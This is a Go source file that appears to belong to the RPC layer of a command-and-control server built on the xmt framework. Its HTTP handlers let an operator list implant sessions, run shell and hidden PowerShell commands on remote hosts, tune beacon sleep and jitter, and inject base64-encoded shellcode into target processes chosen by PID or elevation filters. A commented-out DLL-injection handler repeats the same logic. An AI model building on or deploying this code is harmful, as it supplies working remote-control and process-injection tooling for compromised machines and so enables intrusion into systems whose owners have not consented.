package rpc

import (
	"context"
	"encoding/base64"
	"net/http"
	"strings"

	"github.com/PurpleSec/routex"
	"github.com/PurpleSec/routex/val"
	"github.com/iDigitalFlame/xmt/c2"
	"github.com/iDigitalFlame/xmt/c2/task"
	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

var (
	errInvalidCmd    = xerr.New("invalid session command")
	errInvalidSleep  = xerr.New("invalid sleep value")
	errInvalidJitter = xerr.New("invalid jitter value")

	valSessionCmd = val.Set{
		val.Validator{Name: "wait", Type: val.Bool, Optional: true},
		val.Validator{Name: "cmd", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "filter", Type: val.Object, Optional: true, Rules: val.Rules{
			val.SubSet{
				val.Validator{Name: "pid", Type: val.Int, Optional: true},
				val.Validator{Name: "session", Type: val.Bool, Optional: true},
				val.Validator{Name: "fallback", Type: val.Bool, Optional: true},
				val.Validator{Name: "elevated", Type: val.Bool, Optional: true},
				val.Validator{Name: "exclude", Type: val.ListString, Optional: true},
				val.Validator{Name: "include", Type: val.ListString, Optional: true},
			},
		}},
	}
	valSessionCode = val.Set{
		val.Validator{Name: "data", Type: val.String, Rules: val.Rules{val.NoEmpty}},
		val.Validator{Name: "filter", Type: val.Object, Rules: val.Rules{
			val.SubSet{
				val.Validator{Name: "pid", Type: val.Int, Optional: true},
				val.Validator{Name: "session", Type: val.Bool, Optional: true},
				val.Validator{Name: "fallback", Type: val.Bool, Optional: true},
				val.Validator{Name: "elevated", Type: val.Bool, Optional: true},
				val.Validator{Name: "exclude", Type: val.ListString, Optional: true},
				val.Validator{Name: "include", Type: val.ListString, Optional: true},
			},
		}},
	}
)

func manage(s *c2.Session, c string) (*c2.Job, error) {
	i := strings.IndexByte(c, 32)
	if i < 4 {
		return manageSingle(s, c)
	}
	var (
		t, e = strings.ToLower(c[0:i]), strings.TrimSpace(c[i+1:])
		a    []string
		l    int
	)
	if len(t) == 0 {
		return nil, errInvalidCmd
	}
	for i := 0; i < len(e); i++ {
		if e[i] == 32 || e[i] == ',' {
			a = append(a, strings.TrimSpace(e[l:i]))
			l = i + 1
		}
	}
	if len(a) == 0 {
		a = []string{e}
	} else if l < len(e) {
		a = append(a, e[l:])
	}
	if len(a) == 0 {
		return nil, errInvalidCmd
	}
	switch t {
	case "sleep":
		if n := strings.IndexByte(a[0], '/'); n > 0 {
			var (
				w, v   = strings.ToLower(strings.TrimSpace(a[0][:n])), strings.TrimSpace(a[0][n+1:])
				d, err = parseSleep(w)
			)
			if err != nil {
				return nil, err
			}
			if len(v) == 0 {
				return s.SetSleep(d)
			}
			j, err := parseJitter(v)
			if err != nil {
				return nil, err
			}
			return s.SetDuration(d, j)
		}
		d, err := parseSleep(a[0])
		if err != nil {
			return nil, err
		}
		return s.SetSleep(d)
	case "jitter":
		j, err := parseJitter(a[0])
		if err != nil {
			return nil, err
		}
		return s.SetJitter(j)
	}
	return nil, errInvalidCmd
}
func manageSingle(s *c2.Session, c string) (*c2.Job, error) {
	return nil, errInvalidCmd
}
func execute(s *c2.Session, c string, w bool, h bool, f *cmd.Filter) (*c2.Job, error) {
	var p *task.Process
	switch c[0] {
	case '.':
		p = &task.Process{Args: []string{"@SHELL@", c[1:]}, Wait: w, Filter: f}
	case '$':
		p = &task.Process{Args: []string{"powershell.exe", "-nop", "-nol", "-c", c[1:]}, Wait: w, Filter: f}
		if s.Device.OS != device.Windows {
			p.Args[0] = "pwsh"
		}
	default:
		p = &task.Process{Args: cmd.Split(c), Wait: w, Filter: f}
	}
	return s.Schedule(task.Execute.Run(p))
}
func (r *Server) httpSession(_ context.Context, w http.ResponseWriter, x *routex.Request) {
	if w.Header().Set("Content-Type", "application/json; charset=utf-8"); !x.IsDelete() && !x.IsGet() {
		errors(http.StatusMethodNotAllowed, http.StatusText(http.StatusMethodNotAllowed), w, x)
		return
	}
	n, err := x.Values.String("session")
	if w.Header().Set("Content-Type", "application/json; charset=utf-8"); err != nil {
		errors(http.StatusBadRequest, http.StatusText(http.StatusBadRequest), w, x)
		return
	}
	v := r.session(n)
	if v == nil {
		errors(http.StatusNotFound, http.StatusText(http.StatusNotFound), w, x)
		return
	}
	if x.IsDelete() {
		c, err := x.Content()
		if err != nil {
			errors(http.StatusBadRequest, err.Error(), w, x)
			return
		}
		if len(c) == 0 {
			errors(http.StatusBadRequest, http.StatusText(http.StatusBadRequest), w, x)
			return
		}
		if c.BoolDefault("shutdown", false) {
			v.Exit()
		} else {
			v.Remove()
		}
		w.WriteHeader(http.StatusOK)
		return
	}
	b, _ := v.MarshalJSON()
	w.Write(b)
}
func (r *Server) httpSessionsGet(_ context.Context, w http.ResponseWriter, _ *routex.Request) {
	c := r.c.Connected()
	if w.Header().Set("Content-Type", "application/json; charset=utf-8"); len(c) == 0 {
		w.Write([]byte(`[]`))
		return
	}
	b := buffers.Get().(*data.Chunk)
	b.WriteUint8(uint8('['))
	for i := range c {
		if i > 0 {
			b.WriteUint8(uint8(','))
		}
		c[i].JSON(b)
	}
	b.WriteUint8(uint8(']'))
	w.Write(b.Payload())
	b.Reset()
	buffers.Put(b)
}
func (r *Server) httpSessionExecPut(_ context.Context, w http.ResponseWriter, x *routex.Request, c routex.Content) {
	s, f, d, e, err := r.lookup("cmd", x, c)
	if w.Header().Set("Content-Type", "application/json; charset=utf-8"); err != nil {
		if e {
			errors(http.StatusNotFound, http.StatusText(http.StatusNotFound), w, x)
		} else {
			errors(http.StatusBadRequest, err.Error(), w, x)
		}
		return
	}
	var j *c2.Job
	if d[0] == '!' {
		j, err = manage(s, d[1:])
	} else {
		j, err = execute(s, d, c.BoolDefault("wait", true), c.BoolDefault("hide", false), f)
	}
	if err != nil {
		errors(http.StatusInternalServerError, err.Error(), w, x)
		return
	}
	j.Update = r.complete
	b, _ := j.MarshalJSON()
	w.WriteHeader(http.StatusCreated)
	w.Write(b)
}
func (r *Server) httpSessionCodePut(_ context.Context, w http.ResponseWriter, x *routex.Request, c routex.Content) {
	s, f, d, e, err := r.lookup("data", x, c)
	if w.Header().Set("Content-Type", "application/json; charset=utf-8"); err != nil {
		if e {
			errors(http.StatusNotFound, http.StatusText(http.StatusNotFound), w, x)
		} else {
			errors(http.StatusBadRequest, err.Error(), w, x)
		}
		return
	}
	if f == nil {
		errors(http.StatusBadRequest, "refusing to inject code into self", w, x)
		return
	}
	b, err := base64.StdEncoding.DecodeString(d)
	if err != nil {
		errors(http.StatusBadRequest, err.Error(), w, x)
		return
	}
	j, err := s.Schedule(task.Inject.Run(&task.Code{Data: b, Filter: f}))
	if err != nil {
		errors(http.StatusBadRequest, err.Error(), w, x)
		return
	}
	j.Update = r.complete
	b, _ = j.MarshalJSON()
	w.WriteHeader(http.StatusCreated)
	w.Write(b)
}

/*
func (r *Server) httpSessionDllPut(_ context.Context, w http.ResponseWriter, x *routex.Request, c routex.Content) {
	s, f, d, e, err := r.lookup("data", x, c)
	if w.Header().Set("Content-Type", "application/json; charset=utf-8"); err != nil {
		if e {
			errors(http.StatusNotFound, http.StatusText(http.StatusNotFound), w, x)
		} else {
			errors(http.StatusBadRequest, err.Error(), w, x)
		}
		return
	}
	if f == nil {
		errors(http.StatusBadRequest, "refusing to inject code into self", w, x)
		return
	}
	b, err := base64.StdEncoding.DecodeString(d)
	if err != nil {
		errors(http.StatusBadRequest, err.Error(), w, x)
		return
	}
	j, err := s.Schedule(task.Inject.Run(&task.Code{Data: b, Filter: f}))
	if err != nil {
		errors(http.StatusBadRequest, err.Error(), w, x)
		return
	}
	j.Update = r.complete
	b, _ = j.MarshalJSON()
	w.WriteHeader(http.StatusCreated)
	w.Write(b)
}
*/
